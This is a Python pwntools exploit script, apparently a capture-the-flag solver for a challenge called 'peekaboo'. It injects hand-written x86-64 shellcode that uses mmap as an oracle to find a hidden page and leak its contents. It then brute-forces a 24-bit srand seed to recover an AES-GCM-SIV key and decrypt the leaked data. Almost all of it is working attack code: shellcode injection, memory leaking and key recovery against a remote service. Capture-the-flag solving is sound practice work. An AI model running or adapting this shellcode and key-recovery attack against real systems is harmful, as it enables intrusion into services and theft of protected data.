#!/usr/bin/env python3
"""peekaboo: mmap-oracle dest, leak GCM-SIV blob, invert 24-bit srand, decrypt."""
from __future__ import annotations

import argparse
import base64
import ctypes
import os
import subprocess
import sys

from pwn import *

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.abspath(os.path.join(HERE, ".."))
FILES = os.path.join(ROOT, "files")
RUN = os.path.join(HERE, "run")
U24 = os.path.join(HERE, "artifacts", "ubuntu2404", "libc.so.6")
DEC = os.path.join(RUN, "decrypt3")

context.arch = "amd64"


def shellcode() -> bytes:
    sc = asm(
        r"""
        xor r12, r12
        mov r13, 0x3fffff
    find_loop:
        cmp r12, r13
        je found
        mov rax, r13
        sub rax, r12
        add rax, 1
        shr rax, 1
        test rax, rax
        jnz 1f
        mov rax, 1
    1:
        mov r14, rax
        mov rdi, r12
        mov rax, 0x100000000
        add rdi, rax
        shl rdi, 12
        mov r15, rdi
        mov rsi, r14
        shl rsi, 12
        xor rdx, rdx
        mov r10, 0x100022
        mov r8, -1
        xor r9, r9
        mov eax, 9
        syscall
        cmp rax, r15
        jne occupied
        mov rdi, r15
        mov rsi, r14
        shl rsi, 12
        mov eax, 11
        syscall
        add r12, r14
        jmp find_loop
    occupied:
        lea r13, [r12 + r14 - 1]
        jmp find_loop
    found:
        mov r15, r12
        mov rax, 0x100000000
        add r15, rax
        shl r15, 12
        mov rdi, 0x31339000
        mov [rdi], r15
        mov eax, 1
        mov edi, 1
        mov rsi, 0x31339000
        mov edx, 8
        syscall
        mov rsi, r15
        xor rcx, rcx
    len_loop:
        cmp byte ptr [rsi + rcx], 0
        je len_done
        inc rcx
        cmp rcx, 0x400
        jb len_loop
    len_done:
        mov rdi, 0x31339000
        mov [rdi], rcx
        mov r14, rcx
        mov eax, 1
        mov edi, 1
        mov rsi, 0x31339000
        mov edx, 8
        syscall
        xor r13, r13
    copy_loop:
        cmp r13, r14
        jae done
        mov rcx, r14
        sub rcx, r13
        cmp rcx, 8
        jbe 2f
        mov rcx, 8
    2:
        mov rsi, r15
        add rsi, r13
        mov rdi, 0x31339000
        mov rbx, rcx
        rep movsb
        mov eax, 1
        mov edi, 1
        mov rsi, 0x31339000
        mov rdx, rbx
        syscall
        add r13, rbx
        jmp copy_loop
    done:
        mov eax, 231
        xor edi, edi
        syscall
    """
    )
    assert len(sc) <= 0xF65, hex(len(sc))
    return sc.ljust(0xF65, b"\x90")


def load_rand(path: str | None):
    lib = ctypes.CDLL(path or None)
    lib.srand.argtypes = [ctypes.c_uint]
    lib.rand.restype = ctypes.c_int
    return lib


def colliding_keys(idx: int, lib) -> list[tuple[int, bytes]]:
    hits = []
    for seed in range(1 << 24):
        lib.srand(seed)
        if (lib.rand() & 0x3FFFFF) == idx:
            hits.append((seed, bytes(lib.rand() & 0xFF for _ in range(32))))
    return hits


def decrypt(key: bytes, nonce: bytes, tag: bytes, ct: bytes) -> bytes | None:
    p = subprocess.run([DEC], input=key + nonce + tag + ct, capture_output=True)
    if p.returncode == 0:
        return p.stdout
    return None


def leak(io) -> tuple[int, bytes]:
    io.send(shellcode())
    data = io.recvrepeat(5)
    if len(data) < 16:
        raise SystemExit(f"short leak {data!r}")
    dest = u64(data[:8])
    n = u64(data[8:16])
    blob = data[16 : 16 + n]
    return dest, blob


def recover(dest: int, blob: bytes, libc_paths: list[str | None]) -> bytes:
    idx = (dest >> 12) - 0x100000000
    raw = base64.b64decode(blob)
    nonce, tag, ct = raw[:12], raw[12:28], raw[28:]
    log.info("dest=%s idx=%s n=%d", hex(dest), hex(idx), len(blob))
    for path in libc_paths:
        lib = load_rand(path)
        hits = colliding_keys(idx, lib)
        log.info("libc %s candidates %s", path or "native", [h[0] for h in hits])
        for seed, key in hits:
            pt = decrypt(key, nonce, tag, ct)
            if pt is not None:
                log.success("seed %s via %s -> %s", seed, path or "native", pt)
                return pt
    raise SystemExit("no colliding seed decrypted")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--local", action="store_true")
    ap.add_argument("--host", default="34104dad3376e96b.chal.ctf.ae")
    ap.add_argument("--port", type=int, default=443)
    args = ap.parse_args()
    context.log_level = "info"
    if args.local:
        os.makedirs(RUN, exist_ok=True)
        io = process(os.path.join(RUN, "prob"), cwd=RUN)
    else:
        io = remote(args.host, args.port, ssl=True)
    dest, blob = leak(io)
    try:
        io.close()
    except Exception:
        pass
    paths: list[str | None] = [U24 if os.path.exists(U24) else None, None]
    # unique preserve order
    seen = set()
    uniq = []
    for p in paths:
        if p not in seen:
            seen.add(p)
            uniq.append(p)
    pt = recover(dest, blob, uniq)
    sys.stdout.buffer.write(pt)
    if not pt.endswith(b"\n"):
        sys.stdout.buffer.write(b"\n")


if __name__ == "__main__":
    main()
